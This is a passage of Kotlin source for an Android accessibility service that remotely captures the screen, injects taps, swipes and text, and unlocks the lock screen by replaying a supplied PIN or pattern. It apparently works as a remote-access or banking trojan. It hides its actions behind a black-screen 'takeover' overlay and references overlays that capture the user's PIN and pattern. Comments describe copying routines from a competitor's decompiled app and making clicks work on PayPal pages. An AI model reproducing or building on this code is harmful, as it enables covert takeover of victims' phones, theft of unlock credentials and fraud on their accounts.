                "ScreenCapture",
                "watchdog(captureScreenOnceFull): force release isCapturingFrame after ${now - captureStartedAt}ms",
            )
            isCapturingFrame = false
        }
        if (keyguardRemoteUnlockActive || now < gesturePriorityUntil || isCapturingFrame) {
            if (attempt >= SNAPSHOT_RETRY_MAX) {
                onComplete(
                    ScreenCaptureBridge.CaptureResult(
                        false,
                        error = if (isCapturingFrame) "capture_in_progress" else "gesture_priority",
                    ),
                )
                return
            }
            captureHandler.postDelayed(
                { captureScreenOnceFull(onComplete, attempt + 1) },
                SNAPSHOT_RETRY_DELAY_MS,
            )
            return
        }

        isCapturingFrame = true
        captureStartedAt = now
        takeScreenshotForCapture(onComplete, restoreBlackAfter = false, fullQuality = true)
    }

    private fun takeScreenshotForCapture(
        onComplete: (ScreenCaptureBridge.CaptureResult) -> Unit,
        restoreBlackAfter: Boolean,
        fullQuality: Boolean = false,
    ) {
        val executor = Executor { command -> captureHandler.post(command) }
        takeScreenshot(
            Display.DEFAULT_DISPLAY,
            executor,
            object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    if (restoreBlackAfter) {
                        runOnMainSync {
                            blackScreenOverlay?.setOpaqueBlackVisible(true)
                        }
                    }
                    captureExecutor.execute {
                        val result = if (fullQuality) {
                            processScreenshot(
                                screenshot,
                                maxWidth = SNAPSHOT_MAX_WIDTH,
                                jpegQuality = SNAPSHOT_JPEG_QUALITY,
                            )
                        } else {
                            processScreenshot(screenshot)
                        }
                        captureHandler.post {
                            isCapturingFrame = false
                            if (result.ok) {
                                lastCaptureAt = System.currentTimeMillis()
                                if (!fullQuality) {
                                    lastCachedResult = result
                                }
                            }
                            onComplete(result)
                        }
                    }
                }

                override fun onFailure(errorCode: Int) {
                    if (restoreBlackAfter) {
                        runOnMainSync {
                            blackScreenOverlay?.setOpaqueBlackVisible(true)
                        }
                    }
                    captureHandler.post {
                        isCapturingFrame = false
                        val staleCache = lastCachedResult?.takeIf { it.ok }
                        if (!fullQuality && staleCache != null && errorCode == 3) {
                            onComplete(staleCache)
                            return@post
                        }
                        onComplete(
                            ScreenCaptureBridge.CaptureResult(
                                ok = false,
                                error = "screenshot_failed_$errorCode",
                            ),
                        )
                    }
                }
            },
        )
    }

    private fun takeScreenshotForBitmap(
        onComplete: (ScreenCaptureBridge.BitmapCaptureResult) -> Unit,
    ) {
        val executor = Executor { command -> captureHandler.post(command) }
        takeScreenshot(
            Display.DEFAULT_DISPLAY,
            executor,
            object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    captureExecutor.execute {
                        val result = processScreenshotBitmap(screenshot, maxWidth = WEBRTC_FRAME_WIDTH)
                        captureHandler.post {
                            isCapturingFrame = false
                            if (result.ok) {
                                lastCaptureAt = System.currentTimeMillis()
                            }
                            onComplete(result)
                        }
                    }
                }

                override fun onFailure(errorCode: Int) {
                    captureHandler.post {
                        isCapturingFrame = false
                        onComplete(
                            ScreenCaptureBridge.BitmapCaptureResult(
                                ok = false,
                                error = "screenshot_failed_$errorCode",
                            ),
                        )
                    }
                }
            },
        )
    }

    private fun runOnMainSync(block: () -> Unit) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            block()
            return
        }
        val latch = CountDownLatch(1)
        captureHandler.post {
            block()
            latch.countDown()
        }
        latch.await(1, TimeUnit.SECONDS)
    }

    fun performClick(x: Float, y: Float): ControlResult {
        if (x < 0f || y < 0f) {
            return ControlResult(false, "invalid_coordinates")
        }
        if (Looper.myLooper() == Looper.getMainLooper()) {
            val holder = arrayOf(ControlResult(false, "gesture_main_thread_forbidden"))
            val latch = CountDownLatch(1)
            gestureCallbackHandler.post {
                holder[0] = performClickInternal(x, y)
                latch.countDown()
            }
            latch.await(CLICK_GESTURE_TIMEOUT_MS + 1000L, TimeUnit.MILLISECONDS)
            return holder[0]
        }
        return performClickInternal(x, y)
    }

    private fun performClickInternal(
        x: Float,
        y: Float,
        durationMs: Long = CLICK_DURATION_MS,
        timeoutMs: Long = CLICK_GESTURE_TIMEOUT_MS,
    ): ControlResult {
        // Chrome/WebView: ACTION_CLICK 常返回 true 但不触发真实点击（PayPal 等页）。
        // 远程 click 对齐竞品：Web 场景只走 dispatchGesture；原生仍优先节点点击。
        // 锁屏 PIN / keyguard 走独立路径，不经过这里。
        if (shouldUseGestureOnlyClick(x, y)) {
            return dispatchClickGesture(x, y, durationMs, timeoutMs)
        }

        val nodeResult = performClickViaNode(x, y)
        if (nodeResult.ok) {
            invalidateCaptureCache()
            return nodeResult
        }

        return dispatchClickGesture(x, y, durationMs, timeoutMs)
    }

    private fun dispatchClickGesture(
        x: Float,
        y: Float,
        durationMs: Long,
        timeoutMs: Long,
    ): ControlResult {
        markGestureActive(durationMs + 400L)
        return try {
            withOverlayPassthrough {
                val path = Path().apply { moveTo(x, y) }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
                    .build()
                val result = dispatchGestureSync(gesture, timeoutMs)
                if (result.ok) {
                    invalidateCaptureCache()
                }
                result
            }
        } finally {
            clearGestureActive()
        }
    }

    /**
     * WebView / 浏览器页优先用手势点击。
     * 仅根据当前窗口包名 + 坐标命中链上的 class 判断，避免影响原生 App。
     */
    private fun shouldUseGestureOnlyClick(x: Float, y: Float): Boolean {
        val root = rootInActiveWindow ?: return false
        try {
            val packageName = root.packageName?.toString().orEmpty()
            if (isWebLikePackage(packageName)) {
                return true
            }
            val hits = mutableListOf<AccessibilityNodeInfo>()
            try {
                collectNodesAtPoint(root, x.toInt(), y.toInt(), hits)
                return hits.any { node -> isWebLikeClass(node.className?.toString().orEmpty()) }
            } finally {
                hits.forEach { node -> runCatching { node.recycle() } }
            }
        } finally {
            runCatching { root.recycle() }
        }
    }

    private fun isWebLikePackage(packageName: String): Boolean {
        if (packageName.isBlank()) {
            return false
        }
        val pkg = packageName.lowercase()
        return pkg.contains("chrome") ||
            pkg.contains("firefox") ||
            pkg.contains("opera") ||
            pkg.contains("brave") ||
            pkg.contains("webview") ||
            pkg.contains("sbrowser") ||
            pkg.contains("microsoft.emmx") ||
            pkg.endsWith(".browser") ||
            pkg.contains(".browser.") ||
            pkg == "com.android.browser"
    }

    private fun isWebLikeClass(className: String): Boolean {
        if (className.isBlank()) {
            return false
        }
        return className.contains("WebView", ignoreCase = true) ||
            className.contains("AwContents", ignoreCase = true) ||
            className.contains("ChromeView", ignoreCase = true) ||
            className.contains("content.browser", ignoreCase = true)
    }

    fun performSwipe(
        x1: Float,
        y1: Float,
        x2: Float,
        y2: Float,
        durationMs: Long,
        timeoutMs: Long = GESTURE_TIMEOUT_MS,
    ): ControlResult {
        if (durationMs <= 0L) {
            return ControlResult(false, "invalid_duration")
        }
        // Never await gesture completion on main (competitor: off-main wait).
        if (Looper.myLooper() == Looper.getMainLooper()) {
            val holder = arrayOf(ControlResult(false, "gesture_main_thread_forbidden"))
            val latch = CountDownLatch(1)
            gestureCallbackHandler.post {
                holder[0] = performSwipeInternal(x1, y1, x2, y2, durationMs, timeoutMs)
                latch.countDown()
            }
            latch.await(timeoutMs + durationMs + 1000L, TimeUnit.MILLISECONDS)
            return holder[0]
        }
        return performSwipeInternal(x1, y1, x2, y2, durationMs, timeoutMs)
    }

    private fun performSwipeInternal(
        x1: Float,
        y1: Float,
        x2: Float,
        y2: Float,
        durationMs: Long,
        timeoutMs: Long = GESTURE_TIMEOUT_MS,
    ): ControlResult {
        val dx = kotlin.math.abs(x2 - x1)
        val dy = kotlin.math.abs(y2 - y1)
        val isHorizontal = dx > dy
        val effectiveDuration = if (isHorizontal) {
            maxOf(durationMs, HORIZONTAL_SWIPE_MIN_DURATION_MS)
        } else {
            durationMs
        }
        val effectiveTimeout = if (isHorizontal) {
            maxOf(timeoutMs, effectiveDuration + HORIZONTAL_SWIPE_TIMEOUT_EXTRA_MS)
        } else {
            timeoutMs
        }
        markGestureActive(effectiveDuration + 500L)
        return try {
            withOverlayPassthrough {
                val path = Path().apply {
                    moveTo(x1, y1)
                    lineTo(x2, y2)
                }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, effectiveDuration))
                    .build()

                val result = dispatchGestureSync(gesture, effectiveTimeout)
                if (result.ok) {
                    invalidateCaptureCache()
                }
                result
            }
        } finally {
            clearGestureActive()
        }
    }

    private fun performClickViaNode(x: Float, y: Float): ControlResult {
        val root = rootInActiveWindow ?: return ControlResult(false, "no_active_window")
        val target = findBestClickTargetAt(root, x.toInt(), y.toInt())
        root.recycle()
        if (target == null) {
            return ControlResult(false, "no_node_at_point")
        }

        target.performAction(AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS)
        val clicked = target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        target.recycle()
        return if (clicked) {
            ControlResult(true)
        } else {
            ControlResult(false, "node_click_failed")
        }
    }

    private fun findBestClickTargetAt(root: AccessibilityNodeInfo, x: Int, y: Int): AccessibilityNodeInfo? {
        val hits = mutableListOf<AccessibilityNodeInfo>()
        collectNodesAtPoint(root, x, y, hits)
        if (hits.isEmpty()) {
            return null
        }

        try {
            val clickable = hits.filter { node ->
                node.isClickable || (node.isEnabled && node.isFocusable)
            }
            if (clickable.isNotEmpty()) {
                val best = clickable.minByOrNull { node ->
                    val bounds = Rect()
                    node.getBoundsInScreen(bounds)
                    bounds.width() * bounds.height()
                }
                return best?.let { AccessibilityNodeInfo.obtain(it) }
            }

            return pickClickableNode(hits.last())
        } finally {
            hits.forEach { it.recycle() }
        }
    }

    private fun collectNodesAtPoint(
        node: AccessibilityNodeInfo,
        x: Int,
        y: Int,
        out: MutableList<AccessibilityNodeInfo>,
    ) {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (!bounds.contains(x, y)) {
            return
        }

        out.add(AccessibilityNodeInfo.obtain(node))
        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            collectNodesAtPoint(child, x, y, out)
            child.recycle()
        }
    }

    private fun markGestureActive(durationMs: Long) {
        // Must cover full swipe length; takeScreenshot mid-gesture cancels dispatchGesture.
        gesturePriorityUntil = System.currentTimeMillis() +
            durationMs.coerceIn(400L, GESTURE_CAPTURE_PAUSE_MS)
    }

    private fun clearGestureActive() {
        gesturePriorityUntil = 0L
    }

    private fun invalidateCaptureCache() {
        lastCachedResult = null
        lastCaptureAt = 0L
    }

    fun performInputText(text: String, mode: String = "replace"): ControlResult {
        val normalizedMode = mode.trim().lowercase().ifBlank { "replace" }
        if (normalizedMode == "append" && text.isEmpty()) {
            return ControlResult(false, "text_required")
        }
        if (normalizedMode != "delete" &&
            normalizedMode != "enter" &&
            normalizedMode != "append" &&
            normalizedMode != "replace"
        ) {
            return ControlResult(false, "unsupported_input_mode:$normalizedMode")
        }

        val root = rootInActiveWindow
            ?: return ControlResult(false, "no_active_window")

        val targetNode = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            ?: findEditableNode(root)
            ?: return ControlResult(false, "no_editable_node").also { root.recycle() }

        targetNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)

        val result = when (normalizedMode) {
            "enter" -> performImeEnter(targetNode)
            "delete" -> {
                val current = targetNode.text?.toString().orEmpty()
                val next = if (current.isEmpty()) "" else current.dropLast(1)
                setNodeText(targetNode, next)
            }
            "append" -> {
                val current = targetNode.text?.toString().orEmpty()
                setNodeText(targetNode, current + text)
            }
            else -> setNodeText(targetNode, text)
        }

        targetNode.recycle()
        root.recycle()
        return result
    }

    private fun setNodeText(targetNode: AccessibilityNodeInfo, value: String): ControlResult {
        val args = Bundle().apply {
            putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                value,
            )
        }
        return if (targetNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)) {
            ControlResult(true)
        } else {
            ControlResult(false, "set_text_failed")
        }
    }

    private fun performImeEnter(targetNode: AccessibilityNodeInfo): ControlResult {
        // AccessibilityNodeInfo.ACTION_IME_ENTER = 0x40 (API 30+). Use literal to avoid
        // unresolved-reference when compile classpath lacks the named constant.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (targetNode.performAction(ACTION_IME_ENTER)) {
                return ControlResult(true)
            }
        }
        val current = targetNode.text?.toString().orEmpty()
        return if (targetNode.isMultiLine) {
            setNodeText(targetNode, "$current\n")
        } else {
            ControlResult(false, "ime_enter_unsupported")
        }
    }

    fun performSwipeUpToUnlock(): ControlResult {
        return performSwipeUpForPinEntry()
    }

    fun wakeScreenForKeyguard(): ControlResult {
        KeyguardWakeHelper.wakeForKeyguard(this)
        Thread.sleep(keyguardProfile.timing.wakeSettleMs)

        if (DeviceStateHelper.isInteractive(this)) {
            return ControlResult(true)
        }

        keyguardProfile.wakeFallback(keyguardHost)
        Thread.sleep(keyguardProfile.timing.wakeSettleMs)

        return if (DeviceStateHelper.isInteractive(this)) {
            ControlResult(true)
        } else {
            ControlResult(false, "screen_not_interactive")
        }
    }

    fun performGlobalNavAction(action: String): ControlResult {
        val globalAction = when (action.lowercase()) {
            "back" -> GLOBAL_ACTION_BACK
            "home" -> GLOBAL_ACTION_HOME
            "recents", "menu", "overview" -> GLOBAL_ACTION_RECENTS
            "lock", "lock_screen" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    GLOBAL_ACTION_LOCK_SCREEN
                } else {
                    return ControlResult(false, "lock_screen_requires_api_28")
                }
            }
            else -> return ControlResult(false, "unsupported_nav_action:$action")
        }
        return if (performGlobalAction(globalAction)) {
            ControlResult(true)
        } else {
            ControlResult(false, "global_action_failed")
        }
    }

    /** 仅打开电源菜单，不自动点重启/确认；由人手动滑动完成。 */
    fun performReboot(): ControlResult {
        if (!DeviceStateHelper.isInteractive(this)) {
            KeyguardWakeHelper.wakeForKeyguard(this)
            Thread.sleep(keyguardProfile.timing.wakeSettleMs)
        }

        if (!performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)) {
            return ControlResult(false, "open_power_dialog_failed")
        }
        return ControlResult(true)
    }

    /** 远程「卸载」：只关掉本服务，不卸 APK、不撤设备管理员。延迟执行以便命令回包先发出。 */
    fun performDisableAccessibility(): ControlResult {
        captureHandler.postDelayed({ disableSelf() }, DISABLE_SELF_DELAY_MS)
        return ControlResult(true)
    }

    private fun findNodeByTexts(
        root: AccessibilityNodeInfo,
        texts: Set<String>,
    ): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val label = listOfNotNull(
                node.text?.toString(),
                node.contentDescription?.toString(),
            ).joinToString(" ").lowercase()

            if (texts.any { keyword -> label.contains(keyword.lowercase()) }) {
                return node
            }

            for (index in 0 until node.childCount) {
                node.getChild(index)?.let { queue.add(it) }
            }
            if (node !== root) {
                node.recycle()
            }
        }
        return null
    }

    private fun performSwipeUpForPinEntry(): ControlResult {
        if (isPinKeypadVisible()) {
            return ControlResult(true)
        }
        return withOverlaysSuspendedForKeyguardGesture {
            dismissLockCoverAggressively()
            keyguardProfile.dismissToPinPage(keyguardHost)
            Thread.sleep(keyguardProfile.timing.pinPageSettleMs)
            ControlResult(true)
        }
    }

    private fun ensurePinKeypadReady(): Boolean {
        if (isPinKeypadVisible()) {
            return true
        }

        repeat(PIN_KEYPAD_READY_ROUNDS) {
            tryNodeDismissLockCover()
            if (isPinKeypadVisible()) {
                return true
            }
            dismissLockCoverAggressively()
            if (isPinKeypadVisible()) {
                return true
            }
            keyguardProfile.dismissToPinPage(keyguardHost)
            if (isPinKeypadVisible()) {
                return true
            }
            // PIN may already be on screen while tree lags — poll keys, don't blind-wait 2.5s.
            repeat(PIN_KEYPAD_WAIT_RETRIES) {
                if (isPinKeypadVisible()) {
                    return true
                }
                Thread.sleep(PIN_KEYPAD_WAIT_MS)
            }
        }
        return isPinKeypadVisible()
    }

    /**
     * Samsung One UI cover shows keyguard_indication_text="滑动来解锁".
     * Touchable accessibility shield eats gestures — overlays must be detached first.
     * Swipe style matches mamimobi d91.m1786k: fire-and-forget + sleep.
     */
    private fun dismissLockCoverAggressively() {
        val (screenW, screenH) = unlockSwipeScreenSizePx()
        val swipes = listOf(
            // mamimobi exact: (W/2, 4/5 H) → (W/2, H/3), 600ms
            floatArrayOf(screenW / 2f, screenH * 4f / 5f, screenW / 2f, screenH / 3f, 600f),
            // From indication band (~ bottom 11–15%)
            floatArrayOf(screenW / 2f, screenH * 0.88f, screenW / 2f, screenH * 0.25f, 650f),
            floatArrayOf(screenW / 2f, screenH * 0.90f, screenW / 2f, screenH * 0.20f, 700f),
        )
        for ((index, s) in swipes.withIndex()) {
            if (isCredentialBouncerVisible()) {
                return
            }
            if (index > 0 && !isLockCoverVisible()) {
                return
            }
            performUnlockSwipeFireAndForget(s[0], s[1], s[2], s[3], s[4].toLong())
            DeviceStateHelper.pokeUserActivity(this)
            Thread.sleep(keyguardProfile.timing.swipeAfterPauseMs)
            if (isCredentialBouncerVisible()) {
                return
            }
        }
    }

    private fun isLockCoverVisible(): Boolean {
        if (isCredentialBouncerVisible()) {
            return false
        }
        val roots = collectInteractionRoots()
        try {
            for (root in roots) {
                for (viewId in LOCK_COVER_DISMISS_VIEW_IDS) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(viewId) ?: continue
                    val hit = nodes.firstOrNull { node ->
                        if (!node.isVisibleToUser) {
                            return@firstOrNull false
                        }
                        val label = listOfNotNull(
                            node.text?.toString(),
                            node.contentDescription?.toString(),
                        ).joinToString(" ").lowercase()
                        LOCK_COVER_HINTS.any { hint -> label.contains(hint) }
                    }
                    nodes.forEach { runCatching { it.recycle() } }
                    if (hit != null) {
                        return true
                    }
                }
            }
            return false
        } finally {
            roots.forEach { runCatching { it.recycle() } }
        }
    }

    /** Node-level dismiss for Samsung cover when gesture injection is flaky. */
    private fun tryNodeDismissLockCover() {
        val windowList = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            windows
        } else {
            null
        }
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try {
            windowList?.forEach { window ->
                window.root?.let { roots.add(it) }
            }
            rootInActiveWindow?.let { roots.add(it) }
            for (root in roots) {
                for (viewId in LOCK_COVER_DISMISS_VIEW_IDS) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(viewId) ?: continue
                    for (node in nodes) {
                        try {
                            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK) ||
                                node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) ||
                                node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
                            ) {
                                Thread.sleep(400L)
                                if (isCredentialBouncerVisible()) {
                                    return
                                }
                            }
                            var parent = node.parent
                            while (parent != null) {
                                val clicked = parent.isClickable &&
                                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                val next = parent.parent
                                parent.recycle()
                                parent = next
                                if (clicked) {
                                    Thread.sleep(400L)
                                    if (isCredentialBouncerVisible()) {
                                        return
                                    }
                                    break
                                }
                            }
                        } finally {
                            node.recycle()
                        }
                    }
                }
            }
        } finally {
            roots.forEach { it.recycle() }
            windowList?.forEach { it.recycle() }
        }
    }

    /**
     * mamimobi d91.m1786k: dispatchGesture(..., null, null) then rely on sleep.
     * Sync wait + overlay passthrough fights Samsung keyguard dismiss.
     */
    private fun performUnlockSwipeFireAndForget(
        x1: Float,
        y1: Float,
        x2: Float,
        y2: Float,
        durationMs: Long,
    ): ControlResult {
        val path = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
            .build()

        markGestureActive(durationMs)
        val holder = booleanArrayOf(false)
        if (Looper.myLooper() == Looper.getMainLooper()) {
            holder[0] = dispatchGesture(gesture, null, null)
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = dispatchGesture(gesture, null, null)
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        Thread.sleep(durationMs + 150L)
        return if (holder[0]) {
            ControlResult(true)
        } else {
            ControlResult(false, "dispatch_gesture_failed")
        }
    }

    private fun <T> withOverlaysSuspendedForKeyguardGesture(block: () -> T): T {
        val overlay = blackScreenOverlay?.takeIf { it.isActive() }
        val takeover = phoneTakeoverOverlay?.takeIf { it.isActive() }
        if (overlay == null && takeover == null) {
            return block()
        }
        runOnServiceHandlerBlocking {
            overlay?.beginSuspendForSystemGesture()
            takeover?.setTouchPassthrough(true)
        }
        // Let WindowManager finish detach before injecting gestures.
        Thread.sleep(250L)
        return try {
            block()
        } finally {
            runOnServiceHandlerBlocking {
                takeover?.setTouchPassthrough(false)
                overlay?.endSuspendForSystemGesture()
            }
        }
    }

    private fun runOnServiceHandlerBlocking(block: () -> Unit) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            block()
            return
        }
        val latch = CountDownLatch(1)
        captureHandler.post {
            try {
                block()
            } finally {
                latch.countDown()
            }
        }
        latch.await(3, TimeUnit.SECONDS)
    }

    /** mamimobi uses Resources.getSystem().getDisplayMetrics() for unlock swipes. */
    private fun unlockSwipeScreenSizePx(): Pair<Float, Float> {
        val metrics = resources.displayMetrics
        return metrics.widthPixels.toFloat() to metrics.heightPixels.toFloat()
    }

    private fun realScreenSizePx(): Pair<Float, Float> {
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = wm.currentWindowMetrics.bounds
            bounds.width().toFloat() to bounds.height().toFloat()
        } else {
            val metrics = android.util.DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            metrics.widthPixels.toFloat() to metrics.heightPixels.toFloat()
        }
    }

    fun performUnlockPin(pin: String, swipeUpFirst: Boolean): ControlResult {
        if (pin.isBlank() || !pin.all { it.isDigit() }) {
            return ControlResult(false, "pin_must_be_digits")
        }

        cachedPinDigitCenters = null
        cachedPinContainerRect = null
        pinProgressDetectable = false
        pinCalibrationSource = PinCalibrationSource.NONE

        return withOverlaysSuspendedForKeyguardGesture {
            // mamimobi: wake already done by command path; always try dismiss→PIN when requested.
            if (swipeUpFirst) {
                if (!DeviceStateHelper.isInteractive(this)) {
                    wakeScreenForKeyguard()
                }
                if (!ensurePinKeypadReady()) {
                    dismissLockCoverAggressively()
                    Thread.sleep(keyguardProfile.timing.unlockReadyMs)
                }
            } else if (!isPinKeypadVisible()) {
                return@withOverlaysSuspendedForKeyguardGesture ControlResult(
                    ok = false,
                    error = "pin_keypad_not_visible",
                    pinLength = pin.length,
                )
            }
            Thread.sleep(keyguardProfile.timing.pinPageSettleMs)

            val initialRoot = findInteractionRoot()
                ?: return@withOverlaysSuspendedForKeyguardGesture ControlResult(
                    false,
                    error = "keyguard_root_not_found",
                    pinLength = pin.length,
                )

            calibratePinKeypadFromTree(initialRoot)
            // Empty PIN slot dots (4~6) must NOT force verification — that blocks typing on Samsung.
            pinProgressDetectable = false

            val pinPageReady = isPinKeypadPageVisible(initialRoot) ||
                !cachedPinDigitCenters.isNullOrEmpty() ||
                probeAnyPinKeyAcrossWindows()
            if (!pinPageReady) {
                initialRoot.recycle()
                return@withOverlaysSuspendedForKeyguardGesture ControlResult(
                    ok = false,
                    error = "keyguard_nodes_not_exposed",
                    pinLength = pin.length,
                )
            }
            initialRoot.recycle()

            // mamimobi AccessService.m1668K: click key{N} directly, no progress verify.
            var digitsEntered = 0
            for ((index, char) in pin.withIndex()) {
                if (!clickPinDigitMamimobi(char.toString())) {
                    val root = refreshInteractionRoot()
                    val clicked = try {
                        clickPinDigitWithVerify(char, char.toString(), root, digitsEntered)
                    } finally {
                        root?.recycle()
                    }
                    if (!clicked.ok) {
                        return@withOverlaysSuspendedForKeyguardGesture ControlResult(
                            ok = false,
                            error = clicked.error,
                            digitsEntered = digitsEntered,
                            pinLength = pin.length,
                        )
                    }
                }
                digitsEntered++
                Thread.sleep(keyguardProfile.timing.digitIntervalMs)
                if (index == 3) {
                    Thread.sleep(MID_PIN_PAUSE_MS)
                }
            }

            // mamimobi: after digits, click OK/Enter when present.
            Thread.sleep(keyguardProfile.timing.confirmAfterPinMs)
            val confirmRoot = refreshInteractionRoot()
            try {
                pressPinConfirmIfNeeded(confirmRoot)
            } finally {
                confirmRoot?.recycle()
            }
            Thread.sleep(keyguardProfile.timing.pinPageSettleMs)

            val keyguardStillLocked = isDeviceLocked()
            val allDigitsVerified = digitsEntered >= pin.length
            ControlResult(
                ok = allDigitsVerified && !keyguardStillLocked,
                error = when {
                    !allDigitsVerified -> "pin_digits_incomplete"
                    keyguardStillLocked -> "keyguard_still_locked"
                    else -> null
                },
                digitsEntered = digitsEntered,
                pinLength = pin.length,
            )
        }
    }

    /**
     * mamimobi sa0.f / i71: remote one-click pattern unlock via PATH dispatchGesture.
     * Samsung needs pattern view visible first; also fall back to live cell centers.
     */
    fun performUnlockPattern(
        gesturePathJson: String,
        cellsPath: String = "",
        swipeUpFirst: Boolean = true,
        cellsOnly: Boolean = false,
    ): ControlResult {
        val pathJson = gesturePathJson.trim()
        val cells = PatternGestureCodec.parseCells(cellsPath)
        val absolutePoints = if (cellsOnly) {
            emptyList()
        } else {
            PatternGestureCodec.decode(pathJson)
        }
        if (absolutePoints.size < 2 && cells.size < 4) {
            return ControlResult(false, "pattern_path_required")
        }

        return withOverlaysSuspendedForKeyguardGesture {
            DeviceStateHelper.holdUnlockWakeLock(this)
            val remoteDismiss = !(cellsOnly && !swipeUpFirst)
            if (remoteDismiss) {
                beginKeyguardRemoteUnlock()
            }
            try {
                unlockPatternAfterWake(
                    absolutePoints = absolutePoints,
                    cells = cells,
                    cellsOnly = cellsOnly,
                    swipeUpFirst = swipeUpFirst,
                )
            } finally {
                if (remoteDismiss) {
                    endKeyguardRemoteUnlock()
                }
                DeviceStateHelper.releaseUnlockWakeLock()
            }
        }
    }

    private fun unlockPatternAfterWake(
        absolutePoints: List<Pair<Float, Float>>,
        cells: List<Int>,
        cellsOnly: Boolean,
        swipeUpFirst: Boolean,
    ): ControlResult {
        keyguardPinSyncHandler.removeCallbacks(keyguardPinSyncRunnable)
        val inPlaceCellsUnlock = cellsOnly && !swipeUpFirst
        if (!inPlaceCellsUnlock) {
            // 先抑制再卸层，避免 a11y 事件在 hide 与 suppress 之间把 overlay 重新挂上
            patternOverlaySuppressedUntil =
                System.currentTimeMillis() + PATTERN_UNLOCK_SUPPRESS_MS
            hidePatternCaptureOverlay()
        } else {
            Log.i("PatternCapture", "in-place cells unlock: keep pattern overlay")
        }
        hidePinKeypadCaptureOverlay()

        if (swipeUpFirst) {
            if (!DeviceStateHelper.isInteractive(this)) {
                wakeScreenForKeyguard()
            }
            DeviceStateHelper.pokeUserActivity(this)
            val ready = ensurePatternViewReady()
            Log.i(
                "PatternCapture",
                "pattern bouncer ready=$ready interactive=${DeviceStateHelper.isInteractive(this)}",
            )
            if (!ready && (cellsOnly || absolutePoints.size < 2)) {
                return ControlResult(
                    ok = false,
                    error = "pattern_view_not_visible",
                    pinLength = cells.size.coerceAtLeast(absolutePoints.size),
                )
            }
        } else if (inPlaceCellsUnlock) {
            if (currentPatternViewBounds() == null) {
                return ControlResult(
                    ok = false,
                    error = "pattern_view_not_visible",
                    pinLength = cells.size,
                )
            }
        } else if (!waitForPatternViewVisible(timeoutMs = 2500L)) {
            return ControlResult(
                ok = false,
                error = "pattern_view_not_visible",
                pinLength = cells.size.coerceAtLeast(absolutePoints.size),
            )
        }

        val settleMs = if (inPlaceCellsUnlock) {
            keyguardProfile.timing.pinPageSettleMs.coerceAtMost(200L)
        } else {
            keyguardProfile.timing.pinPageSettleMs
        }
        Thread.sleep(settleMs)

        // 1) Absolute PATH (mamimobi primary) — Web cellsOnly 跳过
        if (!cellsOnly && absolutePoints.size >= 2) {
            val duration = PatternGestureCodec.replayDurationMs(absolutePoints.size)
            replayPatternPoints(absolutePoints, duration)
            Thread.sleep(PATTERN_UNLOCK_SETTLE_MS)
            if (!isDeviceLocked()) {
                return ControlResult(
                    ok = true,
                    digitsEntered = absolutePoints.size,
                    pinLength = absolutePoints.size,
                )
            }
            Log.i("PatternCapture", "absolute PATH unlock still locked, try cells")
        }

        // 2) Live LockPatternView cell centers (resolution/overlay-safe)
        val patternBounds = currentPatternViewBounds()
        if (patternBounds != null && cells.size >= 4) {
            val cellPoints = PatternGestureCodec.pointsFromCells(patternBounds, cells)
            val duration = PatternGestureCodec.replayDurationMs(cellPoints.size)
            replayPatternPoints(cellPoints, duration)
            Thread.sleep(PATTERN_UNLOCK_SETTLE_MS)
            if (!isDeviceLocked()) {
                return ControlResult(
                    ok = true,
                    digitsEntered = cellPoints.size,
                    pinLength = cells.size,
                )
            }
            Log.i("PatternCapture", "cell-center unlock still locked, retry absolute")
        }

        // 3) Absolute PATH retry with longer stroke — Web cellsOnly 跳过
        if (!cellsOnly && absolutePoints.size >= 2) {
            replayPatternPoints(absolutePoints, 800L)
            Thread.sleep(PATTERN_UNLOCK_SETTLE_MS)
        }

        val keyguardStillLocked = isDeviceLocked()
        return ControlResult(
            ok = !keyguardStillLocked,
            error = if (keyguardStillLocked) "keyguard_still_locked" else null,
            digitsEntered = absolutePoints.size.coerceAtLeast(cells.size),
            pinLength = absolutePoints.size.coerceAtLeast(cells.size),
        )
    }

    /**
     * 封面没划开之前最多两轮；封面一旦消失立刻停手，禁止在图案格上继续 swipe
     * （Samsung 失败几次会锁输入，表现为「画图案滑不动」）。
     */
    private fun ensurePatternViewReady(): Boolean {
        if (currentPatternViewBounds() != null) {
            return true
        }
